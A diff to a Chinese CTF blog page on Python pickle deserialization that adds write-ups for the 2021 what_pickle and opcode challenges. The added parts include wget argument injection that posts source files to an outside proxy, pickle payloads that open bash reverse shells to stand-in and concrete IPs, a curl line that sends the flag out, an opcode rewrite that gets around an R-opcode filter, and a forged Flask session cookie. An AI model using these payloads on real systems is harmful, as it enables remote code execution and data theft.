@@ -560,13 +560,122 @@
 <span style=color:#00a8c8>return</span> <span style=color:#111>ticket</span>
 <span style=color:#75715e># b&#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&#39;curr_ticket&#39;\ng0\ndtbg0\n.&#34;</span>
 </code></pre></div></details>
+<details>
+<summary>
+<h4 class=inline>
+栗子3 - [巅峰极客 2021]what_pickle
+</h4>
+</summary>
+<p>登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现</p>
+<p>/images可以看到开着的debug界面</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png alt=image-20211024174438862></p>
+<p>能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来</p>
+<pre tabindex=0><code>/images?image=&amp;argv=--post-file=/app/app.py&amp;argv=--execute=http_proxy=http://ip:port
+</code></pre><pre tabindex=0><code>/images?image=&amp;argv=—post-file=/app/app.py&amp;argv=-e http_proxy=http://ip:port
+</code></pre><p>依次读出/app/app.py和/app/config.py</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># app.py</span>
+<span style=color:#f92672>from</span> <span style=color:#111>flask</span> <span style=color:#f92672>import</span> <span style=color:#111>Flask</span><span style=color:#111>,</span> <span style=color:#111>request</span><span style=color:#111>,</span> <span style=color:#111>session</span><span style=color:#111>,</span> <span style=color:#111>render_template</span><span style=color:#111>,</span> <span style=color:#111>url_for</span><span style=color:#111>,</span><span style=color:#111>redirect</span>
+<span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
+<span style=color:#f92672>import</span> <span style=color:#111>io</span>
+<span style=color:#f92672>import</span> <span style=color:#111>sys</span>
+<span style=color:#f92672>import</span> <span style=color:#111>base64</span>
+<span style=color:#f92672>import</span> <span style=color:#111>random</span>
+<span style=color:#f92672>import</span> <span style=color:#111>subprocess</span>
+<span style=color:#f92672>from</span> <span style=color:#111>ctypes</span> <span style=color:#f92672>import</span> <span style=color:#111>cdll</span>
+<span style=color:#f92672>from</span> <span style=color:#111>config</span> <span style=color:#f92672>import</span> <span style=color:#111>SECRET_KEY</span><span style=color:#111>,</span> <span style=color:#111>notadmin</span><span style=color:#111>,</span><span style=color:#111>user</span>
+
+<span style=color:#111>cdll</span><span style=color:#f92672>.</span><span style=color:#111>LoadLibrary</span><span style=color:#111>(</span><span style=color:#d88200>&#34;./readflag.so&#34;</span><span style=color:#111>)</span>
+
+<span style=color:#111>app</span> <span style=color:#f92672>=</span> <span style=color:#111>Flask</span><span style=color:#111>(</span><span style=color:#111>__name__</span><span style=color:#111>)</span>
+<span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>config</span><span style=color:#f92672>.</span><span style=color:#111>update</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>(</span>
+    <span style=color:#111>SECRET_KEY</span><span style=color:#f92672>=</span><span style=color:#111>SECRET_KEY</span><span style=color:#111>,</span>
+<span style=color:#111>))</span>
+
+<span style=color:#00a8c8>class</span> <span style=color:#75af00>RestrictedUnpickler</span><span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>Unpickler</span><span style=color:#111>):</span>
+    <span style=color:#00a8c8>def</span> <span style=color:#75af00>find_class</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>):</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#111>module</span> <span style=color:#f92672>in</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;config&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>and</span> <span style=color:#d88200>&#34;__&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>name</span><span style=color:#111>:</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>modules</span><span style=color:#111>[</span><span style=color:#111>module</span><span style=color:#111>],</span> <span style=color:#111>name</span><span style=color:#111>)</span>
+        <span style=color:#00a8c8>raise</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>UnpicklingError</span><span style=color:#111>(</span><span style=color:#d88200>&#34;global &#39;</span><span style=color:#d88200>%s</span><span style=color:#d88200>.</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#39; is forbidden&#34;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span><span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>))</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>restricted_loads</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>):</span>
+    <span style=color:#d88200>&#34;&#34;&#34;Helper function analogous to pickle.loads().&#34;&#34;&#34;</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>RestrictedUnpickler</span><span style=color:#111>(</span><span style=color:#111>io</span><span style=color:#f92672>.</span><span style=color:#111>BytesIO</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>))</span><span style=color:#f92672>.</span><span style=color:#111>load</span><span style=color:#111>()</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/index&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>index</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>session</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>None</span><span style=color:#111>):</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#111>url_for</span><span style=color:#111>(</span><span style=color:#d88200>&#39;home&#39;</span><span style=color:#111>))</span>
+    <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index.html&#39;</span><span style=color:#111>)</span>
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#34;POST&#34;</span><span style=color:#111>])</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>login</span><span style=color:#111>():</span>
+    <span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;username&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;test&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>User</span> <span style=color:#f92672>=</span> <span style=color:#111>user</span><span style=color:#111>(</span><span style=color:#111>name</span><span style=color:#111>,</span><span style=color:#111>data</span><span style=color:#111>)</span>
+    <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#34;info&#34;</span><span style=color:#111>]</span><span style=color:#f92672>=</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>User</span><span style=color:#111>))</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#111>url_for</span><span style=color:#111>(</span><span style=color:#d88200>&#39;home&#39;</span><span style=color:#111>))</span>
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/home&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>home</span><span style=color:#111>():</span>
+    <span style=color:#111>info</span> <span style=color:#f92672>=</span> <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#34;info&#34;</span><span style=color:#111>]</span>
+    <span style=color:#111>User</span> <span style=color:#f92672>=</span> <span style=color:#111>restricted_loads</span><span style=color:#111>(</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64decode</span><span style=color:#111>(</span><span style=color:#111>info</span><span style=color:#111>))</span>
+    <span style=color:#111>Jpg_id</span> <span style=color:#f92672>=</span> <span style=color:#111>random</span><span style=color:#f92672>.</span><span style=color:#111>randint</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span><span style=color:#ae81ff>5</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;home.html&#39;</span><span style=color:#111>,</span><span style=color:#111>id</span> <span style=color:#f92672>=</span> <span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>Jpg_id</span><span style=color:#111>),</span> <span style=color:#111>info</span> <span style=color:#f92672>=</span> <span style=color:#111>User</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#111>)</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/images&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>images</span><span style=color:#111>():</span>
+    <span style=color:#111>command</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#34;wget&#34;</span><span style=color:#111>]</span>
+    <span style=color:#111>argv</span><span style=color:#f92672>=</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#f92672>.</span><span style=color:#111>getlist</span><span style=color:#111>(</span><span style=color:#d88200>&#39;argv&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>true_argv</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#111>x</span> <span style=color:#00a8c8>if</span> <span style=color:#111>x</span><span style=color:#f92672>.</span><span style=color:#111>startswith</span><span style=color:#111>(</span><span style=color:#d88200>&#34;-&#34;</span><span style=color:#111>)</span> <span style=color:#00a8c8>else</span> <span style=color:#d88200>&#39;--&#39;</span><span style=color:#f92672>+</span><span style=color:#111>x</span> <span style=color:#00a8c8>for</span> <span style=color:#111>x</span> <span style=color:#f92672>in</span> <span style=color:#111>argv</span><span style=color:#111>]</span>
+    <span style=color:#111>image</span><span style=color:#f92672>=</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#111>[</span><span style=color:#d88200>&#39;image&#39;</span><span style=color:#111>]</span>
+    <span style=color:#111>command</span><span style=color:#f92672>.</span><span style=color:#111>extend</span><span style=color:#111>(</span><span style=color:#111>true_argv</span><span style=color:#111>)</span>
+    <span style=color:#111>command</span><span style=color:#f92672>.</span><span style=color:#111>extend</span><span style=color:#111>([</span><span style=color:#d88200>&#34;-q&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;-O&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;-&#34;</span><span style=color:#111>])</span>
+    <span style=color:#111>command</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://127.0.0.1:8080/&#34;</span><span style=color:#f92672>+</span><span style=color:#111>image</span><span style=color:#111>)</span>
+    <span style=color:#111>image_data</span> <span style=color:#f92672>=</span> <span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#111>command</span><span style=color:#111>,</span><span style=color:#111>stdout</span><span style=color:#f92672>=</span><span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>PIPE</span><span style=color:#111>,</span><span style=color:#111>stderr</span><span style=color:#f92672>=</span><span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>PIPE</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>image_data</span><span style=color:#f92672>.</span><span style=color:#111>stdout</span>
+
+
+
+<span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
+    <span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#111>host</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#111>debug</span><span style=color:#f92672>=</span><span style=color:#00a8c8>True</span><span style=color:#111>,</span> <span style=color:#111>port</span><span style=color:#f92672>=</span><span style=color:#ae81ff>80</span><span style=color:#111>)</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># config.py</span>
+<span style=color:#111>SECRET_KEY</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&#34;</span>
+
+<span style=color:#111>notadmin</span><span style=color:#f92672>=</span><span style=color:#111>{</span><span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>:</span><span style=color:#d88200>&#34;no&#34;</span><span style=color:#111>}</span>
+
+<span style=color:#00a8c8>class</span> <span style=color:#75af00>user</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>def</span> <span style=color:#111>__init__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>username</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#111>):</span>
+        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>username</span> <span style=color:#f92672>=</span> <span style=color:#111>username</span>
+        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>data</span>
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>backdoor</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>):</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>isinstance</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>,</span><span style=color:#111>list</span><span style=color:#111>)</span> <span style=color:#f92672>and</span> <span style=color:#111>notadmin</span><span style=color:#111>[</span><span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>]</span><span style=color:#f92672>==</span><span style=color:#d88200>&#34;yes&#34;</span><span style=color:#111>:</span>
+        <span style=color:#111>s</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>)</span>
+        <span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#111>)</span>
+</code></pre></div><p>这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数<code>eval()</code></p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># 用pker.py生成payload</span>
+<span style=color:#111>s</span><span style=color:#f92672>=</span><span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#34;config&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;notadmin&#34;</span><span style=color:#111>)</span>
+<span style=color:#111>s</span><span style=color:#111>[</span><span style=color:#d88200>&#34;admin&#34;</span><span style=color:#111>]</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;yes&#34;</span>
+<span style=color:#111>user</span><span style=color:#f92672>=</span><span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#34;config&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;user&#34;</span><span style=color:#111>)</span>
+<span style=color:#111>user</span><span style=color:#f92672>.</span><span style=color:#111>username</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;tyskill&#34;</span>
+<span style=color:#111>user</span><span style=color:#f92672>.</span><span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;tyskill&#34;</span>
+<span style=color:#111>door</span><span style=color:#f92672>=</span><span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#34;config&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;backdoor&#34;</span><span style=color:#111>,[</span><span style=color:#d88200>&#34;__import__(&#39;subprocess&#39;).call(</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>echo -e &#39;#!/bin/bash</span><span style=color:#8045ff>\\</span><span style=color:#d88200>nsh -i &gt;&amp; /dev/tcp/you_vps_ip/port 0&gt;&amp;1&#39;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>,shell=True)&#34;</span><span style=color:#111>])</span>
+<span style=color:#00a8c8>return</span> <span style=color:#111>user</span>
+</code></pre></div><p>然后<code>base64.b64encode(data)</code>加进<code>session['info']</code>中拿到shell</p>
+<p>看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-><a href=https://juejin.cn/post/6994717395298287624>wp1</a> | <a href=https://ctf.njupt.edu.cn/663.html#what_pickle>wp2</a></p>
+</details>
 <h3 id=--仅可以引入builtins模块>&ndash;&#187;仅可以引入<code>builtins</code>模块</h3>
 <p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png alt=img></p>
 <p>更多知识参考：<a href=https://blog.51cto.com/xpleaf/1764849>深入理解Python中的<code>__builtin__</code>和<code>__builtins__</code></a> | [Python 的内建对象](<a href=https://www.jianshu.com/p/645e973>https://www.jianshu.com/p/645e973</a> 83c1f) | <a href=https://zhuanlan.zhihu.com/p/125693125><code>__builtins__</code> 与 <code>__builtin__</code>（builtins）</a></p>
 <details>
 <summary>
 <h4 class=inline>
-栗子3 - [Code-Breaking 2018] picklecode
+栗子4 - [Code-Breaking 2018] picklecode
 </h4>
 </summary>
 <p>本地复现还是失败，docker地址->https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了</p>
@@ -650,7 +759,7 @@
 <details>
 <summary>
 <h4 class=inline>
-栗子4 - [BalsnCTF 2019] Pyshv1
+栗子5 - [BalsnCTF 2019] Pyshv1
 </h4>
 </summary>
 <p>题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</p>
@@ -678,7 +787,7 @@ return
 <details>
 <summary>
 <h4 class=inline>
-栗子5 - [BalsnCTF 2019] Pyshv2
+栗子6 - [BalsnCTF 2019] Pyshv2
 </h4>
 </summary>
 <p>题目环境->https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</p>
@@ -710,7 +819,7 @@ return
 <details>
 <summary>
 <h4 class=inline>
-[高校战“疫”网络安全分享赛2020] webtmp
+栗子7 - [高校战“疫”网络安全分享赛2020] webtmp
 </h4>
 </summary>
 <p>（这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了<code>R</code>操作码，同时重写<code>find_class()</code>限制引入模块为<code>__main__</code>，两个考点）</p>
@@ -921,7 +1030,53 @@ return
     <span style=color:#d88200>&#34;-c&#34;</span><span style=color:#111>,</span>
     <span style=color:#d88200>&#39;import sys,socket,os,pty;s=socket.socket();s.connect((&#34;8.8.8.8&#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;</span><span style=color:#111>,</span>
 <span style=color:#111>])</span>
-</code></pre></div><h3 id=--使用_getattributeload_objload_inst实现任意文件读取>&ndash;&#187;使用<code>_getattribute()</code>&<code>load_obj()</code>&<code>load_inst()</code>实现任意文件读取</h3>
+</code></pre></div><details>
+<summary>
+<h4 class=inline>
+栗子8 - [巅峰极客 2021]opcode
+</h4>
+</summary>
+<p>首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png alt=image-20211024145247073></p>
+<p>第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的<code>session['data']</code>处</p>
+<p>但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法<u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写<code>pickle.loads</code>方法，只是个摆设</u>，相当于仅对R操作码进行了限制，笑嘻了</p>
+<p>直接上<code>eval()</code>+<code>b'o'</code>来弹shell了，不多bb</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>(</span><span style=color:#111>cbuiltins</span>
+<span style=color:#111>eval</span>
+<span style=color:#111>S</span><span style=color:#d88200>&#39;__import__(&#34;os&#34;).system(</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>bash -c &#34;bash -i &gt;&amp; /dev/tcp/101.35.113.107/8426 0&amp;1&#34;</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>)&#39;</span>
+<span style=color:#111>o</span><span style=color:#f92672>.</span>
+</code></pre></div><p>或者是用<code>system()</code>+<code>curl</code>+<code>b'o'</code>外带flag</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>(</span><span style=color:#111>cos</span>
+<span style=color:#111>system</span>
+<span style=color:#111>S</span><span style=color:#d88200>&#39;curl burp_collaborator.net/?flag=`app/readflag`&#39;</span>
+<span style=color:#111>o</span><span style=color:#f92672>.</span>
+</code></pre></div><p>然后生成b64的内容（用<code>'''</code>的好处是不用考虑太多引号转义的问题</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
+<span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;&#39;&#39;xxxxxxxxxxxxxx&#39;&#39;&#39;</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>data</span><span style=color:#111>))</span>
+</code></pre></div><p>cookie的生成就是flask_session_cookie_manager一把梭了</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ python3 flask_session_cookie_manager3.py encode -s <span style=color:#d88200>&#39;y0u-wi11_neuer_kn0vv-!@#se%32&#39;</span> -t <span style=color:#d88200>&#39;{&#34;data&#34;: &#34;xxxxb64_contentxxxx&#34;, &#34;username&#34;: &#34;adminadmin&#34;}&#39;</span> 
+</code></pre></div><p>————如果按照题目原有的意思，限制<code>builtins</code>+<code>b'R'</code>操作码也是很好做出来的</p>
+<p>先用pker生成带R的opcode</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>getattr</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;getattr&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>dict</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;dict&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>dict_get</span> <span style=color:#f92672>=</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>dict</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;get&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>globals</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;builtins&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;globals&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>builtins</span> <span style=color:#f92672>=</span> <span style=color:#111>globals</span><span style=color:#111>()</span>
+<span style=color:#111>__builtins__</span> <span style=color:#f92672>=</span> <span style=color:#111>dict_get</span><span style=color:#111>(</span><span style=color:#111>builtins</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;__builtins__&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>eval</span> <span style=color:#f92672>=</span> <span style=color:#111>getattr</span><span style=color:#111>(</span><span style=color:#111>__builtins__</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;eval&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>eval</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>return</span>
+<span style=color:#75715e># b&#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&#39;get\&#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&#39;__builtins__\&#39;\ntRp5\n0g0\n(g5\nS\&#39;eval\&#39;\ntRp6\n0g6\n(S\&#39;__import__(&#34;os&#34;).system(&#34;whoami&#34;)\&#39;\ntR.&#39;</span>
+</code></pre></div><p>然后手搓，在调用callable前添加MARK即<code>(</code>，去掉<code>t</code>和调用<code>t</code>用到的MARK</p>
+<p>也就是<code>[callable] [tuple] R===>MARK [callable] [args...] o</code></p>
+<pre tabindex=0><code>b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__(&quot;os&quot;).system(&quot;whoami&quot;)'\no.'''
+</code></pre><p>可以看下区别</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png alt=image-20211024165337816></p>
+<p>修改都是一对一对的，<strong>总结一下方法就是<code>0gx</code>要变为<code>0(gx</code>，<code>(gx</code>要变为<code>gx</code> ，<code>tR</code>换成<code>o</code></strong></p>
+<p>参考：<a href=https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6>wp</a></p>
+</details>
+<h3 id=--使用_getattributeload_objload_inst实现任意文件读取>&ndash;&#187;使用<code>_getattribute()</code>&<code>load_obj()</code>&<code>load_inst()</code>实现任意文件读取</h3>
 <ul>
 <li>
 <p><code>find_class()</code></p>
@@ -1092,7 +1247,7 @@ return
 <details>
 <summary>
 <h4 class=inline>
-栗子7 - [BalsnCTF 2019] Pyshv3
+栗子9 - [BalsnCTF 2019] Pyshv3
 </h4>
 </summary>
 <p>这次的find_class()没有变化，但是structs有具体的实现</p>
@@ -1203,7 +1358,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 12593 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 13878 words in this page.
 </div>
 </div>
 </div>
